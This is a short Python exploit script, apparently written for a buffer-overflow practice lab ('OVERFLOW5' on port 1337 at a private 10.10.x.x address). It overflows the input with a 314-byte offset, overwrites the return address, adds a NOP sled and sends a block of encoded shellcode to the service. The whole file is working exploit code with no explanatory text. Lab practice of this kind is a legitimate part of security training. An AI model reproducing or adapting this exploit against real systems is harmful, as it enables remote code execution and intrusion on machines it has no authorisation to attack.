#!/usr/bin/env python3
import socket

ip = "10.10.175.52"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x85\x72\x56\x85\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x79\x9a\xd4"
"\x85\x81\x5b\xb9\x0c\x64\x6a\xf9\x6b\xed\xdd\xc9\xf8\xa3"
"\xd1\xa2\xad\x57\x61\xc6\x79\x58\xc2\x6d\x5c\x57\xd3\xde"
"\x9c\xf6\x57\x1d\xf1\xd8\x66\xee\x04\x19\xae\x13\xe4\x4b"
"\x67\x5f\x5b\x7b\x0c\x15\x60\xf0\x5e\xbb\xe0\xe5\x17\xba"
"\xc1\xb8\x2c\xe5\xc1\x3b\xe0\x9d\x4b\x23\xe5\x98\x02\xd8"
"\xdd\x57\x95\x08\x2c\x97\x3a\x75\x80\x6a\x42\xb2\x27\x95"
"\x31\xca\x5b\x28\x42\x09\x21\xf6\xc7\x89\x81\x7d\x7f\x75"
"\x33\x51\xe6\xfe\x3f\x1e\x6c\x58\x5c\xa1\xa1\xd3\x58\x2a"
"\x44\x33\xe9\x68\x63\x97\xb1\x2b\x0a\x8e\x1f\x9d\x33\xd0"
"\xff\x42\x96\x9b\x12\x96\xab\xc6\x7a\x5b\x86\xf8\x7a\xf3"
"\x91\x8b\x48\x5c\x0a\x03\xe1\x15\x94\xd4\x06\x0c\x60\x4a"
"\xf9\xaf\x91\x43\x3e\xfb\xc1\xfb\x97\x84\x89\xfb\x18\x51"
"\x1d\xab\xb6\x0a\xde\x1b\x77\xfb\xb6\x71\x78\x24\xa6\x7a"
"\x52\x4d\x4d\x81\x35\x78\x94\x9e\xc4\x14\x9a\xa0\xd7\xb8"
"\x13\x46\xbd\x50\x72\xd1\x2a\xc8\xdf\xa9\xcb\x15\xca\xd4"
"\xcc\x9e\xf9\x29\x82\x56\x77\x39\x73\x97\xc2\x63\xd2\xa8"
"\xf8\x0b\xb8\x3b\x67\xcb\xb7\x27\x30\x9c\x90\x96\x49\x48"
"\x0d\x80\xe3\x6e\xcc\x54\xcb\x2a\x0b\xa5\xd2\xb3\xde\x91"
"\xf0\xa3\x26\x19\xbd\x97\xf6\x4c\x6b\x41\xb1\x26\xdd\x3b"
"\x6b\x94\xb7\xab\xea\xd6\x07\xad\xf2\x32\xfe\x51\x42\xeb"
"\x47\x6e\x6b\x7b\x40\x17\x91\x1b\xaf\xc2\x11\x3b\x52\xc6"
"\x6f\xd4\xcb\x83\xcd\xb9\xeb\x7e\x11\xc4\x6f\x8a\xea\x33"
"\x6f\xff\xef\x78\x37\xec\x9d\x11\xd2\x12\x31\x11\xf7\x12"
"\xb5\xed\xf8")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
